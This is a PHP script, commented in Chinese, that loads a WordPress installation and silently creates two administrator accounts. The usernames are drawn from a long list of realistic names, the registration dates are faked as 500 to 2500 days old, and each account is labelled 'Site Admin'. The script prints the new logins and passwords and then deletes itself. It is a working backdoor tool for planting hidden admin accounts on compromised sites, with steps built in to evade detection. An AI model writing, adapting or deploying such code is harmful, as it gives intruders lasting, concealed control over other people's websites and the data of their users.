<?php
error_reporting(E_ALL);
ini_set('display_errors',1);


/*
=========================
加载 WordPress
=========================
*/

$wp_loaded=false;


$search_paths=[

    __DIR__.'/wp-load.php',

    dirname(__DIR__).'/wp-load.php',

    dirname(dirname(__DIR__)).'/wp-load.php',

    $_SERVER['DOCUMENT_ROOT'].'/wp-load.php'

];


foreach($search_paths as $path){

    if(file_exists($path)){

        require_once $path;

        $wp_loaded=true;

        break;

    }

}


if(!$wp_loaded || !function_exists('wp_insert_user')){

    die("<h3>无法加载 WordPress 环境</h3>");

}




/*
=========================
名字库
=========================
*/


$names=[

"James","John","Michael","William","David","Robert","Daniel","Joseph","Thomas","Charles","Christopher","Matthew","Anthony","Donald","Mark","Paul","Steven","Andrew","Kenneth","George","Joshua","Kevin","Brian","Edward","Ronald","Timothy","Jason","Jeffrey","Ryan","Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon","Benjamin","Samuel","Gregory","Alexander","Patrick","Frank","Raymond","Jack","Dennis","Jerry","Tyler","Aaron","Adam","Nathan","Henry","Zachary","Douglas","Peter","Kyle","Walter","Ethan","Jeremy","Harold","Keith","Christian","Roger","Noah","Gerald","Carl","Terry","Sean","Austin","Arthur","Lawrence","Jesse","Dylan","Bryan","Joe","Jordan","Billy","Bruce","Albert","Willie","Gabriel","Logan","Alan","Juan","Wayne","Elijah","Roy","Ralph","Randy","Eugene","Vincent","Russell","Louis","Philip","Bobby","Johnny","Bradley","Leonard","Stanley","Danny","Lucas","Liam","Oliver","Mason","Sebastian","Aiden","Mateo","Theodore","Leo","Owen","Wyatt","Julian","Ezra","Hudson","Carter","Grayson","Isaac","Lincoln","Asher","Jaxon","Caleb","Connor","Landon","Adrian","Cameron","Nolan","Colton","Xavier","Roman","Dominic","Ian","Evan","Blake","Brody","Bentley","Cooper","Chase","Damian","Declan","Easton","Emmett","Finn","Gavin","Grant","Hayden","Hunter","Jace","Jared","Joel","Jonah","Josiah","Kai","Kaden","Kingston","Luca","Marcus","Maverick","Max","Miles","Micah","Nathaniel","Orion","Parker","Preston","Quinn","Ryder","Sawyer","Silas","Theo","Tristan","Victor","Wesley","Zane","Abigail","Emma","Olivia","Sophia","Isabella","Ava","Mia","Amelia","Emily","Charlotte","Harper","Evelyn","Elizabeth","Sofia","Camila","Luna","Chloe","Grace","Victoria","Riley","Aria","Lily","Aurora","Zoey","Nora","Scarlett","Layla","Hannah","Lillian","Addison","Eleanor","Natalie","Brooklyn","Paisley","Savannah","Claire","Skylar","Lucy","Everly","Anna","Caroline","Nova","Genesis","Kennedy","Samantha","Maya","Willow","Kinsley","Naomi","Aaliyah","Elena","Sarah","Ariana","Allison","Gabriella","Alice","Madelyn","Cora","Ruby","Eva","Serenity","Autumn","Adeline","Hailey","Gianna","Valentina","Isla","Eliana","Ivy","Violet","Sadie","Emery","Delilah","Leah","Mackenzie","Madeline","Piper","Rylee","Peyton","Melanie","Maria","Kaylee","Raelynn","Clara","Hadley","Julia","Melody","Faith","Rose","Margaret","Jasmine","Eliza","Adriana","Valerie","Claudia","Nicole","Rachel","Rebecca","Lauren","Megan","Brittany","Stephanie","Amber","Danielle","Melissa","Crystal","Heather","Tiffany","Courtney","Erin","Ashley","Kimberly","Jessica","Amanda","Jennifer","Michelle","Laura","Christina","Alexandra","Catherine","Paige","Katherine","Brooke","Morgan","Taylor","Sydney","Jenna","Vanessa","Monica","Bianca","Carla","Daniela","Elise","Fiona","Giselle","Helena","Iris","Kara","Lydia","Marina","Nina","Olga","Petra","Rosa","Sabrina","Tessa","Veronica","Wendy","Yvonne","Zoe","Alison","Bethany","Cecilia","Diana","Eileen","Felicity","Georgia","Holly","Isabel","Joanna","Kylie","Lola","Molly","Phoebe","Rosemary","Stella","Theresa","Vivian","Willa","Amara","Bella","Carmen","Daisy","Freya","Gemma","Hazel","Ingrid","Jade","Keira","Leona","Maeve","Noelle","Ophelia","Penelope","Ruth","Sienna","Tabitha","Uma","Verity","Xenia","Zara","Abby","Beatrice","Celeste","Dorothy","Esther","Frances","Gloria","Karen","Martha","Nancy","Patricia","Susan","Teresa","Angela","Barbara","Betty","Carol","Deborah","Donna","Elaine","Janet","Julie","Linda","Lisa","Mary","Pamela","Sandra","Sharon","Shirley","john_dev","michaelx","william_88","davidpro","robert_007","danielwave","josephking","thomasfox","charles_one","chrisnova","matt_zone","anthonyx7","markstone","paulriver","stevenbyte","andrewsky","kevinwolf","jasoncore","ryanstar","jacobfire","ericmoon","justinray","scottmax","brandonx","benjamin_99","samuelhub","alexprime","patrickgo","jacksonx","aaronblue","adamlight","nathanpeak","henrycloud","ethanfox","jeremycode","noahstar","lucaswave","liamzone","oliverking","masonbyte","leo_dark","owenflow","wyattstorm","carterx","loganpro","aidenwave","calebsky","connorfox","adrianmax","nolanstar","xavierone","romanedge","dominicx","ianriver","evanlight","blakecore","cooperhub","chasezone","damianfire","gavinblue","grantmoon","hunterpro","jacewave","joelking","jonahfox","kai_star","maxwellx","milesbyte","micahstorm","parkerone","quinnsky","ryderflow","silasray","theoking","victorx","wesleypro","zanecloud","emma_star","oliviax","sophiawave","isabellapro","avaqueen","mia_light","ameliafox","emilysky","charlottex","harpermoon","evelynstar","elizabethgo","sofiawave","camilaone","luna_blue","chloefox","gracecore","victoriax","rileyzone","ariaflow","lilyrose","aurorasky","zoeymax","norastar","scarlettx","laylaking","hannahpro","addisonx","eleanormoon","nataliewave","brooklynfox","paisleyone","savannahsky","clairelight","lucycore","everlyx","annastar","carolinepro","novablue","samantha7","mayaflow","willowmoon","naomistar","elenafox","sarahzone","arianax","alicewave","rubyqueen","eva_light","autumnsky","haileypro","giannax","valentina","isla_blue","ivyrose","violetmoon","sadiefox","leahstar","piperwave","peytonx","melaniecore","mariaflow","kayleepro","clarahub","juliafox","faithsky","jasminex","elizaone","valerieblue","nicolemoon","rachelstar","rebeccapro","laurenx","meganwave","amberfox","danielle7","melissaone","heatherx","tiffanysky","erinlight","ashleycore","kimberlypro","jessicax","amandawave","jenniferstar","michellex","laurablue","christinafox","alexandra7","katherinex","brookezone","taylormoon","sydneywave","jennastar","vanessapro","monicax","carlafox","danielastar","eliseflow","fionasky","gisellex","irismoon","karawave","lydiaone","marinablue","ninafox","rosastar","sabrinapro","tessax","veronicawave","wendysky","zoeypro","alisonglow","dianastar","hollymoon","alexwolf","brianx01","ethanprime","dylanstorm","ryanbyte","tylerzone","jordanfox","austinking","seanwave","aaronlight","joshmoon","nathanpro","christianx","matthewsky","benstorm","nicholasgo","zacharyhub","kevinstar","georgeflow","haroldblue","arthurfox","lawrencex","jessewave","bryanmoon","joelstar","brucepro","albertone","gabrielx","waynecloud","elijahsky","royfox","ralphwave","vincentx","russellpro","louisstar","philipblue","bobbycore","johnnyflow","leonardx","stanleyfox","dannywave","frankmoon","raymondsky","dennispro","jerryx","timfox","gregoryone","douglaswave","peterstar","walterblue","kylemoon","rogerfox","geraldx","carlpro","terrysky","austinwave","seanblue","jessestar","billyfox","willieone","alanmoon","juanfire","waynex","roycloud","ralphsky","eugenepro","vincentwave","louismoon","philipfox","bobbyx","johnnyblue","bradleyone","leonardwave","stanleypro","dannyfox","lucasmoon","liamstar","oliverwave","masonx","sebastianpro","aidenfox","mateosky","theoking7","owenblue","wyattwave","julianx","ezramoon","hudsonstar","carterfox","graysonpro","isaacblue","lincolnwave","asherx","jaxonmoon","landonstar","cameronfox","nolanpro","coltonsky","xavierwave","romanx","dominicsky","ianmoon","evanfox","blakewave","brodypro","bentleyx","cooperstar","chaseblue","damianmoon","declanfox","eastonwave","emmettx","finnstar","gavinblue","grantmoon","haydenfox","hunterwave","jacepro","jaredx","jonahsky","josiahmoon","kaiwave","kadenfox","kingstonx","luca_star","marcuspro","maverickblue","maxwave","milesfox","micahmoon","nathanielx","orionstar","parkerpro","prestonwave","quinnfox","ryderblue","sawyerx","silasmoon","theopro","tristanwave","victorfox","wesleyblue","zanestar","averyx","baileywave","caseyfox","devonmoon","emersonpro","finleyblue","harleywave","jamiex","kendallstar","lanefox","marleypro","paytonmoon","remywave","robinx","roryfox","sageblue","samstar","shanemoon","spencerpro","tannerwave","teaganx","tobyfox","trinityblue","wrenmoon","zionstar","alexispro","angelwave","charliefox","dakotablue","drewmoon","elliotx","frankiewave","harleyfox","kieranstar","leslieblue","micahpro","quincywave","reesefox","riverstar","rowanmoon","shawnx","skylersky","tobypro","winterwave","zarafox","bellastar","carmenx","daisywave","freyafox","gemmastar","hazelmoon","jadepro","keirablue","lennoxx","morganstar","parkerwave","rileyfox","sawyerpro","loganblue","haydenmoon","skylerx","spencerwave","taylorfox","devonstar","caseypro","averyblue","baileywave","charliex","drewmoon","emeryfox","finleypro","jordanstar","kylewave","alexisblue","angelmoon","blairfox","brooklynx","cameronpro","dallaswave","dylanstar","elliotblue","harperfox","indigomoon","jessiepro","kaiwave","kendallfox","lakeblue","madisonstar","marleyx","morganpro","noahwave","oakleyfox","peytonstar","quinnblue","reaganmoon","riverpro","rowanwave","sydneyfox","teaganstar","valentineblue","wintermoon","zionwave","zoeyfox","amberstar","bella_blue","cassidyx","daphnewave","ericastar","fayemoon","gwenfox","hopepro","irenestar","joyblue","katalinax","lanawave","lolafox","milastar","nadiax","olivestar","paulablue","reneefox","selenastar","tarawave","vera_pro","wandafox","ximenastar","yarablue","abbywave","beatricefox","celestemoon","dorothyx","estherpro","francesblue","gloriawave","joanfox","karensstar","lillianx","marthamoon","nancypro","patriciawave","rosestar","susansky","teresax","angelapro","barbarablue","bettywave","carolfox","deborahstar","donnamoon","elainex","janetpro","julieblue","lindawave","lisastar","maryfox","pamelamoon","sandrapro","sharonwave","shirleyx","victor01","alex99","mikeprime","johnnydev","davidbyte","robertcore","danielhub","josephmax","thomaszone","chriscloud","matthewgo","anthonyfire","markwave","paulsky","stevenfox","andrewmoon","kennypro","georgeblue","joshuaone","kevinstarx","brianflow","edwardwave","ronaldfox","timothyblue","jasonmoon","jeffreypro","ryancloud","jacobwave","garyfox","nicholasstar","ericblue","jonathanx","stephenmoon","larrypro","justinwave","scottfox","brandonblue","benjaminmoon","samuelpro","gregorywave","alexanderfox","patrickstar","frankblue","raymondmoon","jackpro","denniswave","jerryfox","tylerstar","aaronblue","adammoon","nathanpro","henrywave","zacharyfox","douglasstar","peterblue","kylemoon","walterpro","ethanwave","jeremyfox","haroldstar","keithblue","christianmoon","rogerpro","geraldwave","carlx","terryfox","austinblue","arthurmoon","lawrencepro","jessewave2","bryanfox","joestar","jordanblue","billymoon","brucepro","albertwave","gabrielfox","alanstar","juanblue","waynemoon","elijahpro","roywave","ralphfox","eugenestar","vincentblue","russellmoon","louispro","philipwave","bobbyfox","johnnyblue2","adamx01","alexwave","andyfox","andreastar","antonblue","arthurpro","benwave","blakefox","bradstar","brentmoon","calebx","carlwave","cedricfox","clarkstar","codyblue","colinmoon","coreypro","craigwave","curtisfox","damonstar","derekblue","devinmoon","dominicpro","dustinwave","edgarfox","edwinstar","elliotblue","emmetmoon","ericpro","felixwave","garrettfox","gordonstar","grahamblue","grantmoon","griffinpro","harrisonwave","harveyfox","isaiahstar","ivanblue","jasonmoon","jeremiahpro","joelwave","jonasfox","julianstar","justusblue","keeganmoon","kevinpro","kieranwave","kingstonfox","kurtstar","lanceblue","landonmoon","leonpro","liamwave","loganfox","lorenzostar","lucasblue","malcolmmoon","marcuspro","mariofox","marlonstar","masonblue","mattpro","maxwave","melvinfox","michaelstar","milo_blue","mitchellmoon","nathanx","neilwave","nelsonfox","nicholaspro","nolanstar","normanblue","olivermoon","oscarwave","owenfox","paxtonstar","philipblue","quincypro","rafaelwave","ralphfox","ramonstar","reidblue","remingtonmoon","richardpro","rileywave","robertfox","romanstar","ronanblue","roycepro","samsonwave","sawyerfox","scottstar","sethblue","shanepro","silaswave","simonfox","spencerstar","stephenblue","sterlingmoon","tannerpro","theowave","thomasfox","trentstar","trevorblue","tristanmoon","troypro","tysonwave","valentinofox","vernonstar","vincentblue","waltermoon","wesleypro","wilsonwave","xanderfox","zacharystar","zoe_blue","zoeymoon","adelinefox","adrianastar","alexa_blue","alicewave","alyssastar","amandamoon","ameliafox","anastasiapro","andreawave","angelinastar","annabelleblue","annamoon","arianapro","arielwave","ashleyfox","audreyblue","aurorastar","ava_moon","beatrixpro","bella_wave","bethanyfox","biancastar","bridgetblue","briannamoon","brittanypro","brookwave","caitlinfox","camillastar","carolynblue","cassandramoon","catherinepro","ceciliawave","charlottefox","chelseastar","christinablue","clairemoon","clarissapro","cora_wave","courtneyfox","crystalstar","daniellablue","dawnmoon","delilahpro","destinywave","dianfox","donnastar","dorothyblue","edenmoon","elainepro","elizabethwave","ellafox","ellieblue","elsastar","emilymoon","emma_pro","erinwave","estellastar","eveblue","evelynmoon","faithpro","fionawave","florencefox","gabriellastar","gemmablue","georgiamoon","gracepro","hannahwave","hazelfox","helenastar","hollyblue","isabellamoon","ivypro","jacquelinewave","janicefox","jasminestar","jenna_blue","jenniferx","jessicawave","joannastar","jordanmoon","josephinepro","juliewave","karinafox","kathleenstar","katrinablue","kelsey_moon","kristenfox","kristinastar","kyliewave","laurenblue","lauramoon","leahpro","lilianwave","lindseyfox","lisastar","lolasky","lucywave","lydiablue","madelinefox","madisonstar","makaylamoon","maria_pro","marianawave","marilynfox","marissastar","marthablue","marymoon","meganpro","melodywave","miafox","michellestar","mollyblue","monicamoon","nataliepro","nicolewave","ninarose","norafox","oliviastar","paigeblue","paisleymoon","patriciapro","pennywave","phoebefox","presleystar","rachelblue","raeganmoon","rebeccapro","rileywave","rosaliefox","roseblue","ruby_star","samanthamoon","sarahpro","savannahwave","scarlettfox","serenastar","siennablue","sophia_moon","stellafox","summerstar","sydneyblue","taylorpro","teresa_wave","tessfox","trinitystar","valerieblue","vanessamoon","veronicapro","victoriawave","violetfox","vivianstar","wendyblue","whitneymoon","willa_pro","yasminee","zoeywave","zoeblue","abbyfox","adrianblue","aidanstar","alecmoon","alfredpro","allenwave","amosfox","andreblue","angusstar","archermoon","asherpro","atlaswave","atticusfox","becketstar","benedictblue","bensonmoon","bernardpro","blairwave","bostonfox","brockstar","brooksblue","bruno_moon","calvinpro","cameronwave","carsonfox","cassiusstar","chanceblue","chester_moon","claypro","cliffwave","clintonfox","cole_star","colbyblue","connor_moon","corbinpro","dakotawave","daltonfox","damonstar","dariusblue","davidmoon","deanpro","declanwave","desmondfox","devinblue","diego_star","drake_moon","dylanpro","eastong","edenwave","elifox","elijahstar","ellisblue","eltonmoon","enzo_pro","everettwave","fabianfox","finnstar","forestblue","franklinmoon","freddiepro","gabrielwave","gagefox","garystar","griffinblue","guystorm","hamiltonpro","hankwave","hugofox","hunterstar","isaacblue","isidoremoon","jacksonpro","jamesonwave","jaredfox","jasperstar","jaydenblue","jeremy_moon","jessepro","johnsonwave","jonathanfox","josephstar","joshblue","judemoon","julianpro","kaiwave2","karterfox","keatonstar","kennethblue","kingmoon","knoxpro","kylewave","landenfox","lawsonstar","leo_blue","levimoon","lincolnpro","loganwave","lorenzofox","lucianstar","maddoxblue","malachi_moon","manuelpro","marco_wave","masonfox","matteostar","maxwellblue","micahmoon","milo_pro","morganwave","nashfox","nathanstar","nehemiahblue","nicholasmoon","nico_pro","noahwave","oakleyfox","orionstar","oscarblue","otto_moon","paxtonpro","phoenixwave","piercefox","prestonstar","quentinblue","rafaelmoon","reidpro","remywave","rhettfox","riley_star","riverblue","rocco_moon","romanpro","rykerwave","santiagofox","silasstar","sonnyblue","theodoremoon","titanpro","tristanwave","valentinfox","walkerstar","westonblue","winstonmoon"

];





/*
=========================
生成用户名
=========================
*/


function generate_username($names){


    for($i=0;$i<50;$i++){


        $username=strtolower(
            $names[array_rand($names)]
        );


        if(rand(0,1)){

            $username.=rand(10,999);

        }


        if(!username_exists($username)){

            return $username;

        }


    }


    return 'user'.time();



}




/*
=========================
生成密码
=========================
*/


function random_password($length=12){


    $chars=
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%";


    $password='';


    for($i=0;$i<$length;$i++){


        $password.=
        $chars[random_int(0,strlen($chars)-1)];


    }


    return $password;


}





/*
=========================
创建用户
=========================
*/


function create_random_admin($names){



    for($try=0;$try<10;$try++){



        $username=
        generate_username($names);



        if(username_exists($username)){

            continue;

        }



        $password=
        random_password(12);



        if(strlen($password)<12){

            continue;

        }




        $email=
        $username.rand(1000,9999)."@gmail.com";



        /*
        随机注册时间
        500-2500天以前
        */


        $registered=date(

            "Y-m-d H:i:s",

            strtotime(
                "-".rand(500,2500)." days"
            )

        );





        $user_id=wp_insert_user([


            'user_login'=>$username,


            'user_pass'=>$password,


            'user_email'=>$email,


            'user_registered'=>$registered,


            'first_name'=>'Admin',


            'display_name'=>'Site Admin',


            'role'=>'administrator'


        ]);





        if(!is_wp_error($user_id)){



            return [


                'success'=>true,


                'id'=>$user_id,


                'username'=>$username,


                'password'=>$password,


                'registered'=>$registered


            ];



        }



    }





    return [


        'success'=>false,


        'message'=>'创建失败'


    ];



}





/*
=========================
开始创建数量
=========================
*/


$need_create=2;


$results=[];


$max_loop=30;


$i=0;



while(count($results)<$need_create && $i<$max_loop){


    $i++;


    $result=
    create_random_admin($names);



    if($result['success']){


        $duplicate=false;



        foreach($results as $old){


            if($old['username']==$result['username']){


                $duplicate=true;


            }


        }




        if(!$duplicate){


            $results[]=$result;


        }


    }



}






/*
=========================
输出
=========================
*/


echo "<h2>管理员创建报告</h2>";



if(!$results){


    echo "<p style='color:red'>创建失败</p>";


    exit;


}




foreach($results as $index=>$user){


    echo "<div style='border:1px solid #ddd;padding:10px;margin:10px 0'>";


    echo "<b>账户 ".($index+1)."</b><br>";

    echo "状态:
    <span style='color:green'>
    ✓成功
    </span><br>";

    echo "ID:
    ".$user['id']."<br>";

    echo "用户名:
    ".$user['username']."<br>";

    echo "密码:
    ".$user['password']."<br>";

    echo "注册时间:
    ".$user['registered']."";


    echo "</div>";

}




echo "<h3>登录信息汇总</h3>";

echo "<textarea style='width:400px;height:80px'>";


foreach($results as $user){


    echo $user['username'];

    echo ":";

    echo $user['password'];

    echo "\n";


}


echo "</textarea>";



/*
=========================
执行结束删除自身
=========================
*/


ignore_user_abort(true);

set_time_limit(0);


register_shutdown_function(function(){

    @unlink(__FILE__);

});


?>